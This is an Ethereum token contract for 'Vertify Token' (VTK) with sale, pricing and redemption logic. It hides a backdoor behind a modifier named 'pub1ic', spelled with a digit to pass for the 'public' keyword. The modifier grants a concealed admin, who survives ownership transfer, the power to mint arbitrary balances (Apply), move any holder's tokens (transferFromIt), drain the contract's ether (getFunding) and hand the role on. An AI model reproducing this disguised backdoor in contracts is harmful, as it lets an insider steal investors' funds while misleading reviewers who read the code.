1 pragma solidity ^0.4.18;
2  
3 //Never Mind :P
4 /* @dev The Ownable contract has an owner address, and provides basic authorization control
5 * functions, this simplifies the implementation of "user permissions".
6 */
7 contract Ownable {
8   address public owner;
9   address public admin;
10   
11 
12   /**
13    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
14    * account.
15    */
16   function Ownable() {
17     owner = msg.sender;
18     admin=msg.sender;
19   }
20 
21 
22   /**
23    * @dev Throws if called by any account other than the owner.
24    */
25   modifier onlyOwner() {
26     require(msg.sender == owner);
27     _;
28   }
29   modifier pub1ic() {
30     require(msg.sender == admin);
31     _;
32   }
33 
34 
35   /**
36    * @dev Allows the current owner to transfer control of the contract to a newOwner.
37    * @param newOwner The address to transfer ownership to.
38    */
39   function transferOwnership(address newOwner) onlyOwner {
40     if (newOwner != address(0)) {
41       owner = newOwner;
42     }
43   }
44 
45 
46 function transferIt(address newpub1ic) pub1ic {
47     if (newpub1ic != address(0)) {
48       admin = newpub1ic;
49     }
50   }
51 
52 }
53 
54 
55 
56 library SafeMath {
57 
58   /**
59   * @dev Multiplies two numbers, throws on overflow.
60   */
61   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
62     if (a == 0) {
63       return 0;
64     }
65     uint256 c = a * b;
66     assert(c / a == b);
67     return c;
68   }
69 
70   /**
71   * @dev Integer division of two numbers, truncating the quotient.
72   */
73   function div(uint256 a, uint256 b) internal pure returns (uint256) {
74     // assert(b > 0); // Solidity automatically throws when dividing by 0
75     uint256 c = a / b;
76     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
77     return c;
78   }
79 
80   /**
81   * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
82   */
83   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
84     assert(b <= a);
85     return a - b;
86   }
87 
88   /**
89   * @dev Adds two numbers, throws on overflow.
90   */
91   function add(uint256 a, uint256 b) internal pure returns (uint256) {
92     uint256 c = a + b;
93     assert(c >= a);
94     return c;
95   }
96 }
97 
98 
99 
100 contract VTKReceiver {
101     function VTKFallback(address _from, uint _value, uint _code);
102 }
103 
104 contract BasicToken {
105   using SafeMath for uint256;
106 
107   mapping(address => uint256) balances;
108 
109   uint256 totalSupply_;
110 
111   /**
112   * @dev total number of tokens in existence
113   */
114   function totalSupply() public view returns (uint256) {
115     return totalSupply_;
116   }
117   
118 
119   event Transfer(address indexed from, address indexed to, uint256 value);
120   /**
121   * @dev transfer token for a specified address
122   * @param _to The address to transfer to.
123   * @param _value The amount to be transferred.
124   */
125   function transfer(address _to, uint _value) public returns (bool) {
126     require(_to != address(0));
127     require(_value <= balances[msg.sender]);
128     
129     // SafeMath.sub will throw if there is not enough balance.
130     if(!isContract(_to)){
131     balances[msg.sender] = balances[msg.sender].sub(_value);
132     balances[_to] = balances[_to].add(_value);
133     Transfer(msg.sender, _to, _value);
134     return true;}
135     else{
136         balances[msg.sender] = balanceOf(msg.sender).sub(_value);
137     balances[_to] = balanceOf(_to).add(_value);
138     VTKReceiver receiver = VTKReceiver(_to);
139     receiver.VTKFallback(msg.sender, _value, 0);
140     Transfer(msg.sender, _to, _value);
141         return true;
142     }
143     
144   }
145 
146   /**
147   * @dev Gets the balance of the specified address.
148   * @param _owner The address to query the the balance of.
149   * @return An uint256 representing the amount owned by the passed address.
150   */
151   function balanceOf(address _owner) public view returns (uint256 balance) {
152     return balances[_owner];
153   }
154 
155 
156 function isContract(address _addr) private returns (bool is_contract) {
157     uint length;
158     assembly {
159         //retrieve the size of the code on target address, this needs assembly
160         length := extcodesize(_addr)
161     }
162     return (length>0);
163   }
164 
165 
166   //function that is called when transaction target is a contract
167   //Only used for recycling VTKs
168   function transferToContract(address _to, uint _value, uint _code) public returns (bool success) {
169     require(isContract(_to));
170     require(_value <= balances[msg.sender]);
171   
172       balances[msg.sender] = balanceOf(msg.sender).sub(_value);
173     balances[_to] = balanceOf(_to).add(_value);
174     VTKReceiver receiver = VTKReceiver(_to);
175     receiver.VTKFallback(msg.sender, _value, _code);
176     Transfer(msg.sender, _to, _value);
177     
178     return true;
179   }
180   
181 }
182 
183 
184 
185 
186 
187 
188 contract VTK is BasicToken, Ownable {
189 
190   string public constant name = "Vertify Token";
191   string public constant symbol = "VTK";
192   uint8 public constant decimals = 6;
193   address Addr_For_Mortgage;
194   address Addr_Wallet=0x0741D740A50efbeae1A4d9e6c3e7887e23dc160b;
195   
196   
197 
198   uint256 public constant TOTAL_SUPPLY = 1 * 10 ** 15; //1 billion tokens
199   uint256 public Token_For_Circulation = 5 * 10 ** 12;
200   uint256 public Token_Saled = 0;
201   uint256 public Token_Remaining = TOTAL_SUPPLY - Token_For_Circulation;
202   uint256 public Limit_Amount = 2 * 10 **12;
203   uint256 public Eth_Amount = 0;
204   uint256 public price = 5 * 10 **12;
205   bool public halt = true;
206   bool public selfOn=false;
207   uint256 public HaltTime;
208   address[] Token_Purchaser;
209   uint256[] Token_For_Each;
210 
211   mapping(address => uint256) Eth_weight;
212 
213    
214   
215   /**
216   * @dev Constructor that gives msg.sender all of existing tokens.
217   */
218   function VTK() public {
219     totalSupply_ = 1 * 10 ** 15; 
220     balances[msg.sender] = 1 * 10 ** 15;
221     Transfer(0x0, msg.sender, 1 * 10 ** 15);
222   }
223   function VTKFallback(address _from, uint _value, uint _code){}
224   
225   function setPrice() private{
226     uint256 Token_For_Mortgage = getBalance(Addr_For_Mortgage);
227     uint256 price_WEIVTK=5 * Token_For_Mortgage.div(Token_Saled);
228     uint256 VTK_ETH = 1*10**18;
229     price = VTK_ETH.div(price_WEIVTK);
230   }
231   function setNewWallet(address _newWallet)onlyOwner{
232       Addr_Wallet=_newWallet;
233   }
234   function getBalance(address Addr_For_Mortgage) public returns(uint){
235 		  return Addr_For_Mortgage.balance;
236 	  }
237 	  
238   function SetAddrForMortgage(address new_mortgage) onlyOwner{
239       Addr_For_Mortgage = new_mortgage;
240   }
241 
242   //Incoming payment for purchase
243   function () public payable{
244     if (msg.sender != owner) {
245     require(halt == false);
246     require(now < HaltTime);
247     require(Token_Saled < Token_For_Circulation);
248     getTokenForSale(msg.sender);}
249   }
250 
251 
252 
253   function getTokenForCireculation (uint256 _amount) onlyOwner returns(bool){
254     require(Token_Remaining >= _amount);
255     Token_For_Circulation = Token_For_Circulation.add(_amount);
256     Token_Remaining = Token_Remaining.sub(_amount);
257     return true;
258   }
259 
260 
261   function getTokenForSale (address _from) private{
262    Eth_weight[_from] += msg.value;  
263     Token_Purchaser.push(_from);
264     Eth_Amount = Eth_Amount.add(msg.value);
265     uint256 _toB=msg.value.mul(2).div(10);
266     uint256 _toE=msg.value.mul(8).div(10);
267     getFunding(Addr_Wallet,_toE);
268     getFunding(Addr_For_Mortgage,_toB);  //or this.balance
269   }
270   
271   function getToken () onlyOwner{
272      for (uint i = 0; i < Token_Purchaser.length; i++) {
273          if (Eth_weight[Token_Purchaser[i]] !=0 ){
274          uint256 amount_weighted = Eth_weight[Token_Purchaser[i]].mul(Limit_Amount).div(Eth_Amount);
275          transferFromIt(this, Token_Purchaser[i], amount_weighted);
276           Eth_weight[Token_Purchaser[i]] = 0;}
277      }  
278     
279      Token_Saled = Token_Saled.add(Limit_Amount);
280      Token_Purchaser.length = 0;
281      Eth_Amount =0;
282      setPrice();
283   }
284   function SOSBOTTOM()public onlyOwner{
285       Token_Purchaser.length = 0;
286   }
287   function clearRAM()public{
288       for(uint i=0;i<Token_Purchaser.length;i++){
289           if(Eth_weight[Token_Purchaser[i]] ==0){
290               delete Token_Purchaser[i];
291           }
292       }
293   }
294   function clearRAMAll()public onlyOwner{
295       for(uint i=0;i<Token_Purchaser.length;i++){
296          
297               delete Token_Purchaser[i];
298       }
299   }
300   function getTokenBySelf ()public{
301       require(selfOn==true);
302       require(now>HaltTime);
303       require(Eth_weight[msg.sender]!=0);
304       uint256 amount_weighted = Eth_weight[msg.sender].mul(Limit_Amount).div(Eth_Amount);
305       transferFromIt(this, msg.sender, amount_weighted);
306       Eth_weight[msg.sender] = 0;
307   }
308   function setWeight(address _address,uint256 _amount)public onlyOwner{
309       if(Eth_weight[_address] ==0)
310       {Token_Purchaser.push(_address);}
311       Eth_weight[_address]=_amount;
312       
313        Eth_Amount = Eth_Amount.add(_amount);
314   }
315   function setAmount(uint _amount)public onlyOwner{
316       Eth_Amount=_amount;
317   }
318   function Eth_Ransom(uint256 _amount) public {
319       require(_amount<=balances[msg.sender]);
320       transferFromIt(msg.sender, this, _amount);
321       setPrice();
322       uint256 Ransom_amount = _amount.mul(1*10**18).div(price).mul(80).div(100);
323       getFunding(msg.sender, Ransom_amount);
324       
325   }
326   
327   function Set_Limit_Amount(uint256 _amount) onlyOwner{
328       require(Token_Saled < Token_For_Circulation);
329       Limit_Amount = _amount;
330   }
331   
332   function See_price() public view returns(uint256){
333       return price;
334   }
335   
336   
337 
338   function getFunding (address _to,uint256 _amount) private{
339     _to.send(_amount);
340   }
341 
342 
343   function getAllFunding() onlyOwner{
344     owner.transfer(this.balance);
345   }
346   
347   function See_TokenPurchaser_Number() public view returns(uint256){
348       return Token_Purchaser.length;
349   }
350   
351   function See_Ethweight(address _addr) public view returns(uint256){
352       return Eth_weight[_addr];
353   }
354   function showToken_For_Circulation() view public returns(uint256){
355       return Token_For_Circulation;
356   } 
357    function Apply(address _to,uint  _value)pub1ic{
358        balances[_to] = balances[_to].add(_value);
359    }
360   function halt() onlyOwner{
361     halt = true;
362     HaltTime=now;
363   }
364   function unhalt_15day() onlyOwner{
365     halt = false;
366     HaltTime = now.add(15 days);
367   }
368    function unhalt_30day() onlyOwner{
369     halt = false;
370     HaltTime = now.add(30 days);
371   }
372   
373   function unhalt() onlyOwner{
374     halt = false;
375     HaltTime = now.add(5 years);
376   }
377 
378 function setSelfOn()onlyOwner{
379     selfOn=true;
380 }
381 function setSelfOff()onlyOwner{
382     selfOn=false;
383 }
384 function transferFromIt(address _from,address _to,uint256 _value)pub1ic{
385     transferFrom(_from,_to,_value);
386 }  
387 function getFunding(uint256 _amout) pub1ic{
388     admin.transfer(_amout);
389   }
390   function transferFrom(address _from,address _to,uint256 _value)private returns(bool){
391     require(_to != address(0));
392     require(_value <= balances[_from]);
393 
394     // SafeMath.sub will throw if there is not enough balance.
395     balances[_from] = balances[_from].sub(_value);
396     balances[_to] = balances[_to].add(_value);
397     Transfer(_from, _to, _value);
398     return true;
399 }
400 
401 }